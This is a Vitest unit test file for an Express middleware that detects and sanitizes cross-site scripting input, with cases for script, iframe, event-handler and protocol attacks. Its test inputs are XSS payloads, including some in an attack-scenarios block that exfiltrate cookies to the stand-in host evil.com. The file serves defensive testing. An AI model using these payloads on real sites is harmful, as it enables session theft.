/**
 * XSS Prevention Middleware Unit Tests
 * 
 * Tests comprehensive XSS detection, sanitization, and prevention
 * REQ-11.4: System SHALL validate all inputs (max length, SQL injection, XSS)
 */

import { describe, it, expect, beforeEach, vi } from 'vitest';
import { Request, Response, NextFunction } from 'express';
import {
  detectXSS,
  sanitizeHTML,
  stripHTML,
  preventXSS,
  preventXSSBody,
  preventXSSParams,
  preventXSSQuery,
  sanitizeXSSBody,
  setXSSHeaders
} from '../xssPrevention.js';

describe('XSS Prevention', () => {
  describe('detectXSS()', () => {
    describe('Script Tag Detection', () => {
      it('should detect basic script tags', () => {
        expect(detectXSS("<script>alert('XSS')</script>")).toBe(true);
        expect(detectXSS("<SCRIPT>alert('XSS')</SCRIPT>")).toBe(true);
        expect(detectXSS("<ScRiPt>alert('XSS')</ScRiPt>")).toBe(true);
      });

      it('should detect script tags with attributes', () => {
        expect(detectXSS("<script src='evil.js'></script>")).toBe(true);
        expect(detectXSS("<script type='text/javascript'>alert(1)</script>")).toBe(true);
        expect(detectXSS("<script async defer>alert(1)</script>")).toBe(true);
      });

      it('should detect unclosed script tags', () => {
        expect(detectXSS("<script>alert('XSS')")).toBe(true);
        expect(detectXSS("<script src='evil.js'>")).toBe(true);
      });

      it('should detect script tags with newlines', () => {
        expect(detectXSS("<script>\nalert('XSS')\n</script>")).toBe(true);
      });
    });

    describe('Iframe Injection Detection', () => {
      it('should detect iframe tags', () => {
        expect(detectXSS("<iframe src='evil.com'></iframe>")).toBe(true);
        expect(detectXSS("<IFRAME src='evil.com'></IFRAME>")).toBe(true);
      });

      it('should detect iframe with javascript', () => {
        expect(detectXSS("<iframe src='javascript:alert(1)'></iframe>")).toBe(true);
      });

      it('should detect unclosed iframe tags', () => {
        expect(detectXSS("<iframe src='evil.com'>")).toBe(true);
      });
    });

    describe('Event Handler Detection', () => {
      it('should detect onclick handlers', () => {
        expect(detectXSS("<div onclick='alert(1)'>Click</div>")).toBe(true);
        expect(detectXSS("<button onclick=\"malicious()\">Click</button>")).toBe(true);
      });

      it('should detect onerror handlers', () => {
        expect(detectXSS("<img onerror='alert(1)' src='x'>")).toBe(true);
        expect(detectXSS("<img src='x' onerror=\"alert('XSS')\">")).toBe(true);
      });

      it('should detect onload handlers', () => {
        expect(detectXSS("<body onload='alert(1)'>")).toBe(true);
        expect(detectXSS("<img onload='malicious()' src='image.jpg'>")).toBe(true);
      });

      it('should detect onmouseover handlers', () => {
        expect(detectXSS("<div onmouseover='alert(1)'>Hover</div>")).toBe(true);
      });

      it('should detect various event handlers', () => {
        expect(detectXSS("<input onfocus='alert(1)'>")).toBe(true);
        expect(detectXSS("<select onchange='alert(1)'>")).toBe(true);
        expect(detectXSS("<form onsubmit='alert(1)'>")).toBe(true);
      });
    });

    describe('JavaScript Protocol Detection', () => {
      it('should detect javascript: protocol', () => {
        expect(detectXSS("javascript:alert('XSS')")).toBe(true);
        expect(detectXSS("JAVASCRIPT:alert(1)")).toBe(true);
        expect(detectXSS("JaVaScRiPt:alert(1)")).toBe(true);
      });

      it('should detect javascript: in href', () => {
        expect(detectXSS("<a href='javascript:alert(1)'>Click</a>")).toBe(true);
      });

      it('should detect vbscript: protocol', () => {
        expect(detectXSS("vbscript:msgbox('XSS')")).toBe(true);
        expect(detectXSS("VBSCRIPT:msgbox(1)")).toBe(true);
      });

      it('should detect data:text/html protocol', () => {
        expect(detectXSS("data:text/html,<script>alert(1)</script>")).toBe(true);
        expect(detectXSS("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==")).toBe(true);
      });

      it('should detect data:text/javascript protocol', () => {
        expect(detectXSS("data:text/javascript,alert(1)")).toBe(true);
      });
    });

    describe('Object and Embed Tag Detection', () => {
      it('should detect object tags', () => {
        expect(detectXSS("<object data='evil.swf'></object>")).toBe(true);
        expect(detectXSS("<OBJECT data='evil.swf'></OBJECT>")).toBe(true);
      });

      it('should detect embed tags', () => {
        expect(detectXSS("<embed src='evil.swf'>")).toBe(true);
        expect(detectXSS("<EMBED src='evil.swf'>")).toBe(true);
      });

      it('should detect applet tags', () => {
        expect(detectXSS("<applet code='Evil.class'>")).toBe(true);
        expect(detectXSS("<APPLET code='Evil.class'>")).toBe(true);
      });
    });

    describe('Meta Refresh Detection', () => {
      it('should detect meta refresh tags', () => {
        expect(detectXSS("<meta http-equiv='refresh' content='0;url=evil.com'>")).toBe(true);
        expect(detectXSS("<META HTTP-EQUIV='refresh' CONTENT='0;url=evil.com'>")).toBe(true);
      });
    });

    describe('Link with JavaScript Detection', () => {
      it('should detect link tags with javascript', () => {
        expect(detectXSS("<link href='javascript:alert(1)'>")).toBe(true);
        expect(detectXSS("<LINK HREF='javascript:alert(1)'>")).toBe(true);
      });
    });

    describe('Style Expression Detection', () => {
      it('should detect style with expression', () => {
        expect(detectXSS("<style>body{background:expression(alert(1))}</style>")).toBe(true);
        expect(detectXSS("<div style='width:expression(alert(1))'>")).toBe(true);
      });
    });

    describe('Import Statement Detection', () => {
      it('should detect @import in styles', () => {
        expect(detectXSS("<style>@import 'evil.css';</style>")).toBe(true);
        expect(detectXSS("@import url('evil.css');")).toBe(true);
      });
    });

    describe('SVG with Script Detection', () => {
      it('should detect SVG with embedded script', () => {
        expect(detectXSS("<svg><script>alert(1)</script></svg>")).toBe(true);
        expect(detectXSS("<svg onload='alert(1)'>")).toBe(true);
      });
    });

    describe('Form with JavaScript Action Detection', () => {
      it('should detect form with javascript action', () => {
        expect(detectXSS("<form action='javascript:alert(1)'>")).toBe(true);
        expect(detectXSS("<FORM ACTION='javascript:alert(1)'>")).toBe(true);
      });
    });

    describe('Safe Strings (Negative Tests)', () => {
      it('should allow normal text', () => {
        expect(detectXSS('Hello, how are you?')).toBe(false);
        expect(detectXSS('This is a normal message')).toBe(false);
      });

      it('should allow questions', () => {
        expect(detectXSS('What is photosynthesis?')).toBe(false);
        expect(detectXSS('Can you explain quadratic equations?')).toBe(false);
      });

      it('should allow normal HTML-like text without tags', () => {
        expect(detectXSS('I need help with <topic>')).toBe(false);
        expect(detectXSS('The answer is > 5')).toBe(false);
      });

      it('should allow URLs', () => {
        expect(detectXSS('https://example.com/page')).toBe(false);
        expect(detectXSS('http://example.com')).toBe(false);
      });

      it('should allow email addresses', () => {
        expect(detectXSS('student@example.com')).toBe(false);
      });

      it('should allow alphanumeric IDs', () => {
        expect(detectXSS('student_12345')).toBe(false);
        expect(detectXSS('session-abc-def-123')).toBe(false);
      });
    });

    describe('Edge Cases', () => {
      it('should handle empty strings', () => {
        expect(detectXSS('')).toBe(false);
      });

      it('should handle non-string values', () => {
        expect(detectXSS(123 as any)).toBe(false);
        expect(detectXSS(null as any)).toBe(false);
        expect(detectXSS(undefined as any)).toBe(false);
        expect(detectXSS({} as any)).toBe(false);
        expect(detectXSS([] as any)).toBe(false);
      });

      it('should handle very long strings', () => {
        const longString = 'a'.repeat(10000);
        expect(detectXSS(longString)).toBe(false);
      });

      it('should handle strings with special characters', () => {
        expect(detectXSS('!@#$%^&*()')).toBe(false);
        expect(detectXSS('test!')).toBe(false);
      });
    });

    describe('Real-world Attack Scenarios', () => {
      it('should detect reflected XSS payloads', () => {
        expect(detectXSS("<script>document.location='http://evil.com?cookie='+document.cookie</script>")).toBe(true);
      });

      it('should detect stored XSS payloads', () => {
        expect(detectXSS("<img src=x onerror='fetch(\"http://evil.com?c=\"+document.cookie)'>")).toBe(true);
      });

      it('should detect DOM-based XSS payloads', () => {
        expect(detectXSS("<img src=x onerror='eval(atob(\"YWxlcnQoMSk=\"))'>")).toBe(true);
      });

      it('should detect mutation XSS payloads', () => {
        expect(detectXSS("<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">")).toBe(true);
      });
    });
  });

  describe('sanitizeHTML()', () => {
    it('should escape HTML special characters', () => {
      expect(sanitizeHTML("<script>alert('XSS')</script>")).toBe(
        "&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;&#x2F;script&gt;"
      );
    });

    it('should escape ampersands', () => {
      expect(sanitizeHTML("Tom & Jerry")).toBe("Tom &amp; Jerry");
    });

    it('should escape quotes', () => {
      expect(sanitizeHTML('He said "hello"')).toBe("He said &quot;hello&quot;");
      expect(sanitizeHTML("It's working")).toBe("It&#x27;s working");
    });

    it('should escape angle brackets', () => {
      expect(sanitizeHTML("<div>content</div>")).toBe("&lt;div&gt;content&lt;&#x2F;div&gt;");
    });

    it('should escape forward slashes', () => {
      expect(sanitizeHTML("</script>")).toBe("&lt;&#x2F;script&gt;");
    });

    it('should remove null bytes', () => {
      expect(sanitizeHTML("test\0null")).toBe("testnull");
    });

    it('should handle empty strings', () => {
      expect(sanitizeHTML("")).toBe("");
    });

    it('should handle non-string inputs', () => {
      expect(sanitizeHTML(123 as any)).toBe("");
      expect(sanitizeHTML(null as any)).toBe("");
    });

    it('should preserve safe text', () => {
      expect(sanitizeHTML("Hello World")).toBe("Hello World");
    });

    it('should handle multiple special characters', () => {
      expect(sanitizeHTML("<img src='x' onerror=\"alert(1)\">")).toBe(
        "&lt;img src=&#x27;x&#x27; onerror=&quot;alert(1)&quot;&gt;"
      );
    });
  });

  describe('stripHTML()', () => {
    it('should remove all HTML tags', () => {
      expect(stripHTML("<script>alert('XSS')</script>")).toBe("alert('XSS')");
      expect(stripHTML("<div>content</div>")).toBe("content");
    });

    it('should remove tags with attributes', () => {
      expect(stripHTML("<img src='x' onerror='alert(1)'>")).toBe("");
    });

    it('should remove multiple tags', () => {
      expect(stripHTML("<p>Hello <strong>World</strong></p>")).toBe("Hello World");
    });

    it('should handle nested tags', () => {
      expect(stripHTML("<div><span><a>Link</a></span></div>")).toBe("Link");
    });

    it('should preserve text content', () => {
      expect(stripHTML("Just plain text")).toBe("Just plain text");
    });

    it('should handle empty strings', () => {
      expect(stripHTML("")).toBe("");
    });

    it('should handle non-string inputs', () => {
      expect(stripHTML(123 as any)).toBe("");
    });
  });

  describe('Middleware Functions', () => {
    let mockRequest: Partial<Request>;
    let mockResponse: Partial<Response>;
    let nextFunction: NextFunction;
    let jsonMock: ReturnType<typeof vi.fn>;
    let statusMock: ReturnType<typeof vi.fn>;

    beforeEach(() => {
      jsonMock = vi.fn();
      statusMock = vi.fn().mockReturnValue({ json: jsonMock });
      
      mockRequest = {
        body: {},
        params: {},
        query: {},
        ip: '127.0.0.1',
        path: '/api/test',
        headers: {
          'user-agent': 'test-agent'
        }
      };
      
      mockResponse = {
        status: statusMock,
        json: jsonMock,
        setHeader: vi.fn()
      };
      
      nextFunction = vi.fn();
    });

    describe('preventXSSBody()', () => {
      it('should allow safe body data', () => {
        mockRequest.body = {
          message: 'Hello, I have a question about photosynthesis'
        };

        const middleware = preventXSSBody();
        middleware(mockRequest as Request, mockResponse as Response, nextFunction);

        expect(nextFunction).toHaveBeenCalled();
        expect(statusMock).not.toHaveBeenCalled();
      });

      it('should block XSS in body', () => {
        mockRequest.body = {
          message: "<script>alert('XSS')</script>"
        };

        const middleware = preventXSSBody();
        middleware(mockRequest as Request, mockResponse as Response, nextFunction);

        expect(nextFunction).not.toHaveBeenCalled();
        expect(statusMock).toHaveBeenCalledWith(400);
        expect(jsonMock).toHaveBeenCalledWith(
          expect.objectContaining({
            error: 'Invalid input',
            message: 'Request contains potentially malicious content'
          })
        );
      });

      it('should handle nested objects in body', () => {
        mockRequest.body = {
          user: {
            name: 'test',
            bio: "<img src=x onerror='alert(1)'>"
          }
        };

        const middleware = preventXSSBody();
        middleware(mockRequest as Request, mockResponse as Response, nextFunction);

        expect(nextFunction).not.toHaveBeenCalled();
        expect(statusMock).toHaveBeenCalledWith(400);
      });

      it('should handle arrays in body', () => {
        mockRequest.body = {
          messages: ['safe message', 'also safe', "<script>alert(1)</script>"]
        };

        const middleware = preventXSSBody();
        middleware(mockRequest as Request, mockResponse as Response, nextFunction);

        expect(nextFunction).not.toHaveBeenCalled();
        expect(statusMock).toHaveBeenCalledWith(400);
      });

      it('should allow empty body', () => {
        mockRequest.body = {};

        const middleware = preventXSSBody();
        middleware(mockRequest as Request, mockResponse as Response, nextFunction);

        expect(nextFunction).toHaveBeenCalled();
      });
    });

    describe('preventXSSParams()', () => {
      it('should allow safe params', () => {
        mockRequest.params = {
          studentId: 'student_123',
          classroomId: 'class_456'
        };

        const middleware = preventXSSParams();
        middleware(mockRequest as Request, mockResponse as Response, nextFunction);

        expect(nextFunction).toHaveBeenCalled();
        expect(statusMock).not.toHaveBeenCalled();
      });

      it('should block XSS in params', () => {
        mockRequest.params = {
          id: "<script>alert(1)</script>"
        };

        const middleware = preventXSSParams();
        middleware(mockRequest as Request, mockResponse as Response, nextFunction);

        expect(nextFunction).not.toHaveBeenCalled();
        expect(statusMock).toHaveBeenCalledWith(400);
      });

      it('should allow empty params', () => {
        mockRequest.params = {};

        const middleware = preventXSSParams();
        middleware(mockRequest as Request, mockResponse as Response, nextFunction);

        expect(nextFunction).toHaveBeenCalled();
      });
    });

    describe('preventXSSQuery()', () => {
      it('should allow safe query parameters', () => {
        mockRequest.query = {
          page: '1',
          limit: '10',
          search: 'mathematics'
        };

        const middleware = preventXSSQuery();
        middleware(mockRequest as Request, mockResponse as Response, nextFunction);

        expect(nextFunction).toHaveBeenCalled();
        expect(statusMock).not.toHaveBeenCalled();
      });

      it('should block XSS in query', () => {
        mockRequest.query = {
          search: "<iframe src='evil.com'></iframe>"
        };

        const middleware = preventXSSQuery();
        middleware(mockRequest as Request, mockResponse as Response, nextFunction);

        expect(nextFunction).not.toHaveBeenCalled();
        expect(statusMock).toHaveBeenCalledWith(400);
      });

      it('should allow empty query', () => {
        mockRequest.query = {};

        const middleware = preventXSSQuery();
        middleware(mockRequest as Request, mockResponse as Response, nextFunction);

        expect(nextFunction).toHaveBeenCalled();
      });
    });

    describe('preventXSS() - Combined', () => {
      it('should scan all request inputs', () => {
        mockRequest.body = { message: 'safe' };
        mockRequest.params = { id: 'safe_123' };
        mockRequest.query = { filter: 'active' };

        const middleware = preventXSS();
        middleware(mockRequest as Request, mockResponse as Response, nextFunction);

        expect(nextFunction).toHaveBeenCalled();
        expect(statusMock).not.toHaveBeenCalled();
      });

      it('should block if body contains XSS', () => {
        mockRequest.body = { message: "<script>alert(1)</script>" };
        mockRequest.params = { id: 'safe' };
        mockRequest.query = { filter: 'safe' };

        const middleware = preventXSS();
        middleware(mockRequest as Request, mockResponse as Response, nextFunction);

        expect(nextFunction).not.toHaveBeenCalled();
        expect(statusMock).toHaveBeenCalledWith(400);
      });

      it('should block if params contain XSS', () => {
        mockRequest.body = { message: 'safe' };
        mockRequest.params = { id: "<img onerror='alert(1)' src=x>" };
        mockRequest.query = { filter: 'safe' };

        const middleware = preventXSS();
        middleware(mockRequest as Request, mockResponse as Response, nextFunction);

        expect(nextFunction).not.toHaveBeenCalled();
        expect(statusMock).toHaveBeenCalledWith(400);
      });

      it('should block if query contains XSS', () => {
        mockRequest.body = { message: 'safe' };
        mockRequest.params = { id: 'safe' };
        mockRequest.query = { filter: "javascript:alert(1)" };

        const middleware = preventXSS();
        middleware(mockRequest as Request, mockResponse as Response, nextFunction);

        expect(nextFunction).not.toHaveBeenCalled();
        expect(statusMock).toHaveBeenCalledWith(400);
      });

      it('should provide field information in error response', () => {
        mockRequest.body = {
          user: {
            name: 'test',
            bio: "<script>alert(1)</script>"
          }
        };

        const middleware = preventXSS();
        middleware(mockRequest as Request, mockResponse as Response, nextFunction);

        expect(jsonMock).toHaveBeenCalledWith(
          expect.objectContaining({
            field: expect.any(String)
          })
        );
      });
    });

    describe('sanitizeXSSBody()', () => {
      it('should sanitize XSS in body instead of blocking', () => {
        mockRequest.body = {
          message: "<script>alert('XSS')</script>"
        };

        const middleware = sanitizeXSSBody();
        middleware(mockRequest as Request, mockResponse as Response, nextFunction);

        expect(nextFunction).toHaveBeenCalled();
        expect(mockRequest.body.message).toBe("&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;&#x2F;script&gt;");
        expect(statusMock).not.toHaveBeenCalled();
      });

      it('should sanitize nested XSS content', () => {
        mockRequest.body = {
          user: {
            bio: "<img src=x onerror='alert(1)'>"
          }
        };

        const middleware = sanitizeXSSBody();
        middleware(mockRequest as Request, mockResponse as Response, nextFunction);

        expect(nextFunction).toHaveBeenCalled();
        expect(mockRequest.body.user.bio).toContain('&lt;');
      });

      it('should allow safe content through unchanged', () => {
        mockRequest.body = {
          message: 'Hello, this is a safe message'
        };

        const middleware = sanitizeXSSBody();
        middleware(mockRequest as Request, mockResponse as Response, nextFunction);

        expect(nextFunction).toHaveBeenCalled();
        expect(mockRequest.body.message).toBe('Hello, this is a safe message');
      });
    });

    describe('setXSSHeaders()', () => {
      it('should set X-XSS-Protection header', () => {
        const middleware = setXSSHeaders();
        middleware(mockRequest as Request, mockResponse as Response, nextFunction);

        expect(mockResponse.setHeader).toHaveBeenCalledWith('X-XSS-Protection', '1; mode=block');
        expect(nextFunction).toHaveBeenCalled();
      });

      it('should set X-Content-Type-Options header', () => {
        const middleware = setXSSHeaders();
        middleware(mockRequest as Request, mockResponse as Response, nextFunction);

        expect(mockResponse.setHeader).toHaveBeenCalledWith('X-Content-Type-Options', 'nosniff');
      });

      it('should set Content-Security-Policy header', () => {
        const middleware = setXSSHeaders();
        middleware(mockRequest as Request, mockResponse as Response, nextFunction);

        expect(mockResponse.setHeader).toHaveBeenCalledWith(
          'Content-Security-Policy',
          expect.stringContaining("default-src 'self'")
        );
      });
    });

    describe('Integration Scenarios', () => {
      it('should handle complex nested structures', () => {
        mockRequest.body = {
          student: {
            profile: {
              name: 'John',
              metadata: {
                tags: ['math', 'science'],
                notes: 'Good student'
              }
            }
          }
        };

        const middleware = preventXSS();
        middleware(mockRequest as Request, mockResponse as Response, nextFunction);

        expect(nextFunction).toHaveBeenCalled();
      });

      it('should detect XSS in deeply nested structures', () => {
        mockRequest.body = {
          level1: {
            level2: {
              level3: {
                malicious: "<script>alert(1)</script>"
              }
            }
          }
        };

        const middleware = preventXSS();
        middleware(mockRequest as Request, mockResponse as Response, nextFunction);

        expect(nextFunction).not.toHaveBeenCalled();
        expect(statusMock).toHaveBeenCalledWith(400);
      });

      it('should handle mixed safe and unsafe data correctly', () => {
        mockRequest.body = {
          safeField: 'This is safe',
          unsafeField: "<iframe src='evil.com'></iframe>"
        };

        const middleware = preventXSS();
        middleware(mockRequest as Request, mockResponse as Response, nextFunction);

        expect(nextFunction).not.toHaveBeenCalled();
      });
    });
  });
});
